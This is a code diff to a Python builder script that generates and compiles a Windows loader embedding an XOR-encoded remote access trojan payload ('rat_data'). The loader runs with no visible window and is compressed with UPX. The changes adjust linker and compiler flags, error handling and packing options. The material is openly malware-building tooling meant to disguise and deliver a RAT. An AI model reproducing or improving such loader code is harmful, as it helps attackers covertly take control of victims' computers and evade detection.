@@ -54,9 +54,6 @@ def build_loader(original_exe_path):
 
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
-#pragma comment(linker, "/MERGE:.rdata=.data")
-#pragma comment(linker, "/MERGE:.text=.data")
-#pragma comment(linker, "/SECTION:.data,EWR")
 
 static const unsigned char rat_data[] = "{data_b64}";
 static const unsigned char xor_key[] = "{key_b64}";
@@ -132,28 +129,22 @@ int main() {{
         '-O3',
         '-s',
         '-static',
-        '-fno-exceptions',
-        '-fno-rtti',
-        '-fno-stack-protector',
-        '-fvisibility=hidden',
-        '-Wl,--gc-sections',
-        '-Wl,--strip-all',
         '-Wl,--subsystem,windows',
-        '-Wl,--no-insert-timestamp',
-        '-Wl,--merge-identical-sections',
-        '-Wl,--discard-all',
         '-mwindows'
     ]
     
     try:
-        subprocess.run(cmd, check=True, capture_output=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Compilation failed: {e.stderr}")
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        if result.returncode != 0:
+            print(f"Compilation error: {result.stderr}")
+            return None
+    except Exception as e:
+        print(f"Compilation failed: {e}")
         return None
     
     print("Compressing with UPX...")
     try:
-        subprocess.run(['upx', '--best', '--ultra-brute', loader_exe], capture_output=True)
+        subprocess.run(['upx', '--best', loader_exe], capture_output=True)
     except:
         pass
     
